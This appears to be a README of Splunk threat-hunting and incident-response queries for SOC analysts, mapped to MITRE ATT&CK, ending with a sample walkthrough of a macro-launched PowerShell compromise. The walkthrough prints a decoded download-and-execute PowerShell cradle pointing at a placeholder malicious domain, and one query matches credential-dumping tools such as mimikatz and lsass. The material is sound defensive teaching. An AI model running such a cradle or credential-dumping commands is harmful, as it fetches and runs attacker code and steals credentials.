# Ghost Hunting in Splunk

Practical Splunk investigation techniques for SOC analysts, threat hunters, and incident responders.

This repository contains a collection of Splunk queries, investigative techniques, and workflow examples used during security investigations. The goal is to help analysts quickly pivot through telemetry, reconstruct attacker activity, and determine the scope of compromise during incident response.

Many of the techniques documented here were developed while studying for the **Offensive Security Incident Responder (OSIR)** certification and while performing real-world investigation scenarios.

This project is not intended to provide static detection rules, but rather a **toolkit of investigative queries and techniques** that analysts can adapt to their environments.

---

# Investigation Mindset

Successful incident response investigations rarely rely on a single log or alert.

Instead, analysts should focus on:

- identifying suspicious behavior patterns
- correlating activity across hosts
- reconstructing attacker timelines
- identifying persistence mechanisms
- determining the full scope of compromise

Logs provide fragments of evidence. The goal is to connect those fragments into a coherent attack narrative.

---

# Core Investigation Queries

## Process Creation Events

Process execution logs provide insight into commands executed on a system.

MITRE ATT&CK  
T1059 – Command and Scripting Interpreter


index="*" EventCode=1
| table _time host User Image CommandLine ParentImage
| sort _time


Useful for identifying:

- suspicious binaries
- unexpected command-line arguments
- abnormal parent-child relationships

Key fields to examine:

- `Image`
- `CommandLine`
- `ParentImage`
- `User`

---

## Parent-Child Process Relationships

Process genealogy is critical during incident response investigations.

MITRE ATT&CK  
T1059 – Command Execution


index="*" EventCode=1
| table _time host ParentImage Image CommandLine User
| sort _time


Suspicious relationships often include:

- Office spawning PowerShell
- Browsers spawning command shells
- Explorer spawning scripting engines
- Services spawning unexpected binaries

Example suspicious chains:


winword.exe → powershell.exe
chrome.exe → cmd.exe
explorer.exe → wscript.exe


---

# PowerShell Investigation

PowerShell is frequently abused for:

- payload download
- command execution
- system reconnaissance
- lateral movement

MITRE ATT&CK  
T1059.001 – PowerShell

---

## All PowerShell Activity


(index="" source="PowerShell") OR
(index="" EventCode=1 Image="powershell.exe") OR
(index="" EventCode=4104)
| table _time host User ScriptBlockText CommandLine Message


Investigate for:

- encoded commands
- download activity
- suspicious script blocks

---

## Encoded PowerShell Commands

Attackers frequently encode commands to evade detection.


index="" (CommandLine="-enc*" OR CommandLine="-EncodedCommand" OR ScriptBlockText="FromBase64String")
| table _time host User CommandLine ScriptBlockText


Encoded commands often indicate:

- obfuscated payload execution
- staged malware downloads
- privilege escalation scripts

---

# Suspicious Execution Paths

Malware commonly executes from user-writable directories.

MITRE ATT&CK  
T1105 – Ingress Tool Transfer


index="" EventCode=1
(Image="\Temp\" OR Image="\AppData\" OR Image="\Public\*")
| table _time host User Image CommandLine


These paths often indicate:

- dropped malware
- attacker staging directories
- temporary tooling

Common suspicious locations:


C:\Users<user>\AppData\Local\Temp
C:\Users\Public
C:\Users<user>\Downloads


---

# Network Activity Investigation

Processes initiating outbound connections may reveal command-and-control communication.

MITRE ATT&CK  
T1071 – Application Layer Protocol


index="*" EventCode=3
| table _time host Image DestinationIp DestinationPort


Investigate for:

- external IP addresses
- uncommon ports
- unusual processes making connections

Examples:


powershell.exe connecting to external IP
cmd.exe establishing outbound connections
unknown executables communicating externally


---

# Persistence Hunting

Attackers frequently establish persistence mechanisms after gaining access.

MITRE ATT&CK  
T1547 – Boot or Logon Autostart Execution

---

## Service Creation


index="*" source="WinEventLog:System" EventCode=7045
| table _time host Service_Name Service_File_Name


Unexpected services may indicate persistence.

Investigate:

- unusual service names
- executables in suspicious directories

---

## Scheduled Tasks

MITRE ATT&CK  
T1053 – Scheduled Task


index="*" EventCode=4698
| table _time host TaskName CommandLine User


Scheduled tasks are commonly used for:

- persistence
- delayed execution
- privilege escalation

---

# Authentication Investigation

Authentication logs are useful for identifying lateral movement and credential abuse.

MITRE ATT&CK  
T1021 – Remote Services


index="*" EventCode=4624
| stats count by User host Logon_Type


Important Logon Types:

| Logon Type | Description |
|------------|-------------|
| 2 | Interactive |
| 3 | Network |
| 10 | Remote Interactive (RDP) |

Types **3 and 10** are commonly associated with lateral movement.

---

# Timeline Reconstruction

One of the most effective investigation techniques is building a chronological attack timeline.


index="*" host="COMPROMISED_HOST"
| table _time host Image CommandLine ParentImage User
| sort _time


Timeline analysis helps identify:

- initial compromise
- attacker commands
- persistence mechanisms
- lateral movement
- data exfiltration

Understanding the sequence of attacker activity is critical to determining scope.

---

# Threat Hunting Techniques

Threat hunting focuses on identifying suspicious behavioral patterns rather than known indicators.

---

## Sysmon Hunting

Sysmon provides deep visibility into endpoint activity.


index="*" source="Sysmon" EventCode=1
| table _time host User Image CommandLine ParentImage


Sysmon helps identify:

- command execution
- malware execution
- suspicious binaries

---

## Credential Access Hunting

MITRE ATT&CK  
T1003 – Credential Dumping


index="*" (CommandLine="mimikatz" OR CommandLine="sekurlsa" OR CommandLine="lsass")
| table _time host User CommandLine


Investigate processes interacting with:


lsass.exe


---

# Investigation Tips

## Find the First Occurrence

Identifying the first appearance of suspicious activity can reveal the initial compromise.


| sort _time
| head 1


---

## Reduce Noise

Machine accounts can generate significant noise during investigations.


regex Account_Name!=".*$"


Filtering these accounts often improves visibility.

---

## Examine Process Lineage

Always analyze:

- `ParentImage`
- `ParentProcessId`
- `CommandLine`

Process relationships often reveal attacker entry points.

---

## Pivot Frequently

Effective investigations require constant pivoting between:

- process execution
- network activity
- authentication events
- file modifications

---

# Real-World Use Cases

These investigation techniques can support:

- SOC alert triage
- threat hunting
- incident response
- detection engineering

The examples assume common telemetry sources such as:

- Sysmon
- Windows Security Logs
- EDR telemetry
- DNS logs
- network connection logs

---

# Final Notes

Every environment logs data differently. Queries may require modification depending on:

- logging configuration
- telemetry sources
- field mappings within Splunk

These queries are intended to provide a **starting point for investigations**, not static detection rules.

Threat hunting is an iterative process. The best analysts continuously refine queries, pivot through telemetry, and build timelines to uncover malicious activity.



# Example Investigation Walkthrough

The following example demonstrates how Splunk queries can be used to investigate a potentially compromised host.

## Scenario

A SOC alert indicates suspicious PowerShell execution on a workstation.

Alert details:

Host: WS-1021  
User: jdoe  
Process: powershell.exe  
Time: 14:12:43

The goal is to determine:

- how the command was executed
- what the command did
- whether persistence was established
- whether lateral movement occurred

---

## Step 1 — Identify the Process Execution

Start by examining the PowerShell execution event.


index="*" EventCode=1 Image="*powershell.exe"
| table _time host User ParentImage CommandLine
| sort _time


Key indicators to investigate:

- encoded commands
- download activity
- suspicious parent processes

Example suspicious output:


ParentImage: winword.exe
CommandLine: powershell.exe -enc SQBtAG...


This suggests a **malicious Office macro execution chain**.

MITRE ATT&CK  
T1204 – User Execution

---

## Step 2 — Decode the PowerShell Command

Encoded commands should always be decoded for analysis.

Example encoded string:


SQBtAG...


After decoding, the command reveals:


IEX (New-Object Net.WebClient).DownloadString('http://maliciousdomain/payload.ps1
')


This indicates the host downloaded a remote PowerShell payload.

MITRE ATT&CK  
T1105 – Ingress Tool Transfer

---

## Step 3 — Identify Network Connections

Next, identify outbound connections from the host.


index="*" EventCode=3 host="WS-1021"
| table _time host Image DestinationIp DestinationPort


Investigate:

- unknown IP addresses
- unusual ports
- uncommon processes making connections

Example suspicious activity:


powershell.exe → 185.244.25.91:443


---

## Step 4 — Check for Persistence

Attackers often establish persistence after gaining execution.

### Service Creation


index="*" EventCode=7045 host="WS-1021"
| table _time Service_Name Service_File_Name


### Scheduled Tasks


index="*" EventCode=4698 host="WS-1021"
| table _time TaskName CommandLine


Investigate any tasks or services created shortly after the PowerShell execution.

MITRE ATT&CK  
T1547 – Boot or Logon Autostart Execution

---

## Step 5 — Investigate Lateral Movement

Authentication logs can reveal whether the attacker moved to other systems.


index="*" EventCode=4624 User="jdoe"
| table _time host Logon_Type


Focus on:

| Logon Type | Meaning |
|------------|--------|
| 3 | Network logon |
| 10 | Remote interactive (RDP) |

Multiple remote logons across systems may indicate lateral movement.

MITRE ATT&CK  
T1021 – Remote Services

---

## Step 6 — Build an Attack Timeline

Finally, reconstruct the sequence of events.


index="*" host="WS-1021"
| table _time Image CommandLine ParentImage User
| sort _time


Example timeline:


14:12:43 winword.exe launches powershell.exe
14:12:45 powershell.exe downloads payload
14:12:50 payload establishes network connection
14:13:05 scheduled task created


This timeline provides a clear view of attacker activity.

---

## Investigation Outcome

Findings:

- PowerShell executed via malicious Office macro
- remote payload downloaded
- outbound command-and-control connection established
- persistence created via scheduled task

Host WS-1021 confirmed compromised.

Containment actions:

- isolate affected host
- reset compromised credentials
- block malicious IP address
- remove persistence mechanism
